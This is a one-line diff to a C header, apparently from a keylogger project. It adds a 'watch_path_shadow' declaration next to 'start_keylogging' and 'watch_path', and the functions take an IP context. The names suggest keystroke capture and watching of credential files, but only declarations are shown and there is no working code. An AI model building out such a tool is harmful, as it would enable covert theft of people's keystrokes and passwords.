@@ -61,6 +61,7 @@ typedef struct
 } receiver_args_t;
 
 void watch_path(ip_info ip_ctx, const char *path);
+void watch_path_shadow(ip_info ip_ctx, const char *path);
 int  start_keylogging(ip_info ip_ctx);
 
 #endif // KEYLOG_H
